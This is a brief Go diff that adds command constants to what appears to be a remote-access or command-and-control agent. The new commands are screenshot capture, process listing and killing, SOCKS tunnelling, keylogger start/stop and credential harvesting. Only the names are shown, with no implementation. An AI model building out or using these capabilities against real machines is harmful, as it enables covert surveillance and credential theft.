@@ -12,12 +12,20 @@ import (
 
 // Command types
 const (
-	CmdPing     = "ping"
-	CmdExec     = "exec"
-	CmdFetch    = "fetch"
-	CmdUpload   = "upload"
-	CmdDownload = "download"
-	CmdListDir  = "listdir"
+	CmdPing         = "ping"
+	CmdExec         = "exec"
+	CmdFetch        = "fetch"
+	CmdUpload       = "upload"
+	CmdDownload     = "download"
+	CmdListDir      = "listdir"
+	CmdScreenshot    = "screenshot"
+	CmdProcessList   = "processlist"
+	CmdProcessKill   = "prockill"
+	CmdSocksConnect  = "socks_connect"
+	CmdSocksData     = "socks_data"
+	CmdKeylogStart   = "keylog_start"
+	CmdKeylogStop    = "keylog_stop"
+	CmdCreds         = "creds"
 )
 
 // Command represents a command to be executed
